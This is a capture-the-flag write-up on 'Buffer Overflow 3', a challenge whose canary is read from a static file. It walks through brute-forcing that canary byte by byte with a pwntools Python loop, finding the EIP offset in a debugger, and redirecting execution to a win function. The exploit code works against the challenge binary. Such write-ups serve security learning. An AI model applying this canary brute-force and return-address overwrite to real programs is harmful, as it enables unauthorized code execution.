# Buffer Overflow 3

Finally on the last one in the buffer overflow series, lets knock it out! We start by looking at the vuln.c file. We see our usual win function opening the flag file and printing it. The next function is very intresting though, read_canary(). This is opening a file called canary.txt and putting it into a global_canary variable.

![image](https://user-images.githubusercontent.com/6153549/162578632-d144d152-db24-465a-93b6-6c08d7ba7e78.png)

Next we see our vuln() function; this is doing a few new things. we see it copying the global_canary into a canary variable in the function, we're gonna be asked ofrhow many bytes we want to write, then we'll get to put in our input. However, this time if the canary get's overwritten in the stack the program will crash.

![image](https://user-images.githubusercontent.com/6153549/162578928-9ce79bbe-8144-4a7f-89f8-5dd0f415b886.png)

So we got a few things going for us here. First the canary is read from a file, that means it is static and won't be changing on us, second if we guess the canary (which we know is four bytes from the CANARY_SIZE) then we can overflow the stack and put the canary back intact, and lastly - we get to control the length of our input - this means we can guess at the canary one byte at a time instead of trying all combinations.

So first we need to figure out how much we need to write before we hit the canary (which is added at the end of the buffer). Having the C code lets us know the buffer size of the input is set to 64; but lets verify that because why not! Lets go ahead and grab the win function address while we're at it.

![image](https://user-images.githubusercontent.com/6153549/162579061-ced41765-8f4f-46d5-974c-b5daccfc393e.png)

First lets setup a breakpoint. Disassemble the vuln() function and notice the memcpy down at the bottom, this is most likely our stack check because in the vuln.c we see a memcpy used in the if. So lets break right before that.

![image](https://user-images.githubusercontent.com/6153549/162579088-3ee4a47e-de80-4e4f-93f7-3c4cc3ded443.png)

![image](https://user-images.githubusercontent.com/6153549/162579121-af7e2411-954f-4adb-8028-79918110a0f0.png)

Alright, copy our pattern, start the program, and tell it we're going to send it 200 bytes and then paste in our string.

![image](https://user-images.githubusercontent.com/6153549/162579155-1bead173-be7f-4618-8974-6f8f9e446471.png)

We should hit our break point, notice in the stack that our test canary is there in position 0. 

![image](https://user-images.githubusercontent.com/6153549/162579173-c756a27a-fb98-4b9a-a6cf-cbce67376c96.png)

Hit 'n' or 'next' to go to the memcpy statment and see the stack now has our string before the canary. Sweet so we can now see how many bytes this was - 64!

![image](https://user-images.githubusercontent.com/6153549/162579215-e051889e-d9bf-44f2-9e98-f3725dd89457.png)

So now we know how many bytes we need to send to hit the canary. Lets see if we can write a quick loop to find the canary. Lets make our pwntools template per usual and then setup our loop.

```python
#set our win function
win=p32(0x08049336)
#set our buffer
buffer = 64
#set a blank canary value
canary = ''
#we know the canary is four bytes so setup our while loop
while len(canary) < 4:
    #for each item in the rang of ASCII printable characters
    for i in range(32,127):
        #start the program
        p = start()
        #set length to our buffer, plus how long the canary is, plus 1
        length = 64+len(canary)+1
        #send our length number to the first input
        p.sendlineafter("> ", str(length))
        #setup our payload
        payload = "A"*buffer+canary+chr(i)
        #print payload if you'd like to watch it
        #print(payload)
        #send payload tot he input
        p.sendlineafter('> ', payload)
        #print the character we're at if your curious
        #print(chr(i))
        #receive the line returned to see if we broke the canary
        l = p.recvline()
        
        #check if we broke the canary; if we didn't then we guessed the right char and add it to the canary
        if '*** Stack Smashing Detected' not in str(l):
            canary += chr(i)
            log.info('Partial canary: {}'.format(canary))
            break
        #close out the run
        p.close()
#once done print out the canary
log.success('Found canary: {}'.format(canary))
```
![image](https://user-images.githubusercontent.com/6153549/162579238-ad118358-3704-48c4-83d5-1ef2baabec1a.png)

Ok, so now we have the canary. We can now attempt to gain control of EIP, we will send in 64 bytes to get us to the canary, the canary, and then follow that up with a pattern to see if we can find the offset from the canary to EIP overwrite. We say we're sending 268 bytes because 64 + 4 (canary) + 200 byte pattern.

![image](https://user-images.githubusercontent.com/6153549/162579284-2a984a61-a778-4de9-aa5f-efb3ed633920.png)

![image](https://user-images.githubusercontent.com/6153549/162579301-805438c5-aefa-444d-bf71-8eaf05d63f8e.png)

![image](https://user-images.githubusercontent.com/6153549/162579357-79fed78f-4e61-491d-9735-6855fed619a0.png)

![image](https://user-images.githubusercontent.com/6153549/162579419-a2a6963c-51a1-47ca-a0a6-bda956447791.png)

So we see that we've put the canary back onto the stack as it should be! hit `c` to continue execution and see if we overwrite EIP.

![image](https://user-images.githubusercontent.com/6153549/162579467-03269fb0-c46f-44f8-8e07-b9b6d908aed5.png)

![image](https://user-images.githubusercontent.com/6153549/162579471-7c2f52b8-8248-4f35-9e3e-223e638cf95b.png)

We found that the EIP overwrite is 16bytes after the canary. Now just construct our payload and lets send it on!

![image](https://user-images.githubusercontent.com/6153549/162579489-62775ad2-259c-4527-8e9f-fdbf74c9ad08.png)

![image](https://user-images.githubusercontent.com/6153549/162579557-b0bb9856-b60a-4ce6-87e3-1026bcd62089.png)

Sweet; now just send it to the remote server and lets see what happens! Well had some strange issues; after testing sometimes I'd get an EOF for my recvline. I tested this manually and found that sometimes the connection would close with no output which messed up the script.

![image](https://user-images.githubusercontent.com/6153549/162581803-8e43d0a8-e159-4030-9f85-ca05770b690a.png)

![image](https://user-images.githubusercontent.com/6153549/162581889-d49470eb-478e-4716-ba2e-140c16df60f4.png)

So quick change to our verification to treat a blank response the same as a stack smashing response and reverse our check to instead look for Ok which gets printed if the canary is in tact.

```python
        l = p.recvall()
        if(l != ""):
            print(l)
        
            #check if we broke the canary; if we didn't then we guessed the right char and add it to the canary
            if 'Ok' in str(l):
                canary += chr(i)
                log.info('Partial canary: {}'.format(canary))
                break
        #close out the run
        p.close()
```
![image](https://user-images.githubusercontent.com/6153549/162582040-8f5a61ef-06c7-42cb-87b2-974431d457a5.png)
